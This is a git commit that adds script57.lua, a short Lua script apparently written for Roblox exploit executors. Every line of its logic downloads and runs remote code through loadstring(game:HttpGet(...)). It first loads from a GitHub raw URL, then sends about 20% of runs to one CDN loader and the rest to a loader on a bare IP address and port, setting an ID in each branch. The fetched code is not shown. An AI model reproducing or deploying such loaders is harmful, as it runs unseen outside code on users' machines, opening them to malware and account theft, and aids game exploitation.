97071b21659f5c4a2df7e5a9f8d1f44e6bf949cc
Ilusion <romaozin1607@gmail.com>
2025-08-25 19:48:06 -0300

    Adicionando script57.lua automaticamente

---
+++ script57.lua
@@ -0,0 +1,12 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ilusion-scripts/Loading-UI/refs/heads/main/loading"))()
+
+
+local chance = math.random(1, 100)
+
+if chance <= 20 then
+    ID = "d98f46c5-df0d-4ba3-9db0-61244be7c8e6"
+    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+else
+    ID="b9853cc5-5458-4d91-8183-65d410bd2bc2";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+end
